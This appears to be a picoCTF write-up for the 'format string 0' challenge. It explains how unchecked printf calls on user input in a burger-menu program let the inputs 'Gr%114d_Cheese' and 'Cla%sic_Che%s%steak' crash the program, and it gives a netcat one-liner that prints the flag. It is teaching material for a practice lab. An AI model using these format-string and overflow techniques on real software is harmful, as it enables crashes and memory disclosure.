# format string 0 #
 
## Overview ##

50 points

Category: [Binary Exploitation](../)

Tags: `#binaryexploitation #formatstring`

## Description ##

Can you use your knowledge of format strings to make the customers happy?

## Approach ##

Analysing the provided C source code we can see a flag file is read on execution of the program into the `flag` buffer, which gets printed from a Segmentation Fault handler `sigsegv()`, that is registered via the SIGSEGV signal handler.

So our goal is to cause the program to crash with a segmentation fault to trigger the signal handler and print the flag.

The `serve_patrick()` function called from `main()`, reading input from the user via an unbounded `scanf()` into the `choice1` character buffer, of `BUFSIZE` size (32 characters).

This challenge was originally solved by simply overflowing the `choice1` input buffer with an string too large to fit within the space provided, and sufficiently corrupting the stack enough to cause a segmentation fault.

    $ echo "dummyflag{1234}" > flag.txt

    $ echo $(python3 -c 'print("A"*50)') | ./format-string-0 
    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: There is no such burger yet!

    dummyflag{1234}

However this doesn't seem to be in the spirit of the challenge, as a format string was not exploited.

Looking further we find in the `server_patrick()` function a `printf(buffer)` on line `#68`, where the buffer is from user input and hence under out control.

            ...
    61.     char choice1[BUFSIZE];
    62.     scanf("%s", choice1);
    63.     char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    64.     if (!on_menu(choice1, menu1, 3)) {
    65.       printf("%s", "There is no such burger yet!\n");
    66.       fflush(stdout);
    67.     } else {
    68.       int count = printf(choice1);
    69.       if (count > 2 * BUFSIZE) {
    70.         serve_bob();
    71.       } else {
            ...

To execute this code our input must satisfy the conditional logic in line `#64` (input must be a valid option from the three provided). From the valid options we see `Gr%114d_Cheese` contains a format specifier and would get parsed by the `printf()` identified on line `#68`.

    $ echo -e "Gr%114d_Cheese" | ./format-string-0
    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: Gr                                                                                                           4202954_Cheese
    Good job! Patrick is happy! Now can you serve the second customer?
    Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
    Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
    Enter your recommendation: There is no such burger yet!

This format specifier requests `printf()` print the first integer argument, despite none being added and passed via the stack, so a value from the stack will be printed, but also requesting the representation of the integer be padded to 114 characters in the output.

Therefore even with a input string of 14 characters it further satisfies the conditional logic on line `#69`, the resultant output is greater in length than twice the size of the `choice1` input buffer size.

But we haven't caused a segmentation fault yet, so we continue into the execution of the `serve_bob()` function.

            ...
    91.     char choice2[BUFSIZE];
    92.     scanf("%s", choice2);
    93.     char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    94.     if (!on_menu(choice2, menu2, 3)) {
    95.       printf("%s", "There is no such burger yet!\n");
    96.       fflush(stdout);
    97.     } else {
    98.       printf(choice2);
    99.       fflush(stdout);
    100.    }
            ...

Similar to `server_patrick()`, we can execute a `printf()` a user controlled input buffer, with one of the three valid input options. Looking carefully we can see `"Cla%sic_Che%s%steak"` input option has three instances of `"%s"` format specifier to print a string. As there is no arguments passed along with this `printf()` buffer, values on the stack will be interpreted as pointers to strings and attempt to print whatever is at memory at those locations, most likely causing a segmentation fault, as they are likely not point to any null terminated valid strings.

## Solution ##

Putting it all together we have the final solution:

    $ echo -e "Gr%114d_Cheese\x00\nCla%sic_Che%s%steak" | nc mimas.picoctf.net 65128
    Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
    Here comes the first customer Patrick who wants a giant bite.
    Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
    Enter your recommendation: Gr                                                                                                           4202954_Cheese
    Good job! Patrick is happy! Now can you serve the second customer?
    Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
    Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
    Enter your recommendation: ClaCla%sic_Che%s%steakic_Che(null)
    picoCTF{...........redacted.............}

Where the actual flag value has been redacted for the purposes of this write up.